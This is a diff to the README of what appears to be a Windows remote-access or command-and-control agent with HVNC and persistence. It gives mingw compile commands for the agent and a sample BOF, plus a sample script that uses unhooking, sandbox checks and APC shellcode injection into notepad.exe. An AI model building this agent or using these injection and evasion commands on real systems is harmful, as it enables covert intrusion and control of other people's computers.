@@ -27,7 +27,7 @@ HVNC example:
 - Persistence
 
 ## Compilation
-Designed to compile with the mingw GCC Compiler. Compile agent with `x86_64-w64-mingw32-gcc client/main.c -s -Os -lws2_32 -lwininet -m64 -luser32 -lgdi32 -lole32 -lshlwapi -ladvapi32 -mwindows -o main.exe`, sample BOF with `x86_64-w64-mingw32-gcc bof/dlldemo.c -shared -o dlldemo.dll -m64`, run server with `python3 server/server.py`
+Designed to compile with the mingw GCC Compiler. Compile agent with `x86_64-w64-mingw32-gcc agent/main.c -s -Os -lws2_32 -lwininet -m64 -luser32 -lgdi32 -lole32 -lshlwapi -ladvapi32 -lurlmon -mwindows -o main.exe`, sample BOF with `x86_64-w64-mingw32-gcc bof/dlldemo.c -shared -o dlldemo.dll -m64`, run server with `python3 server/server.py`
 
 ## Scripting
 Sample script:
@@ -35,7 +35,6 @@ Sample script:
 unhook
 sandbox
 print "test" -> popint
-bof_execute file(dlldemo.dll)
 shc_inject_apc "C:\Windows\System32\notepad.exe" hex([hex]) FALSE
 print "asdf"
 exec "echo \"lorem ipsum dolor sit\""
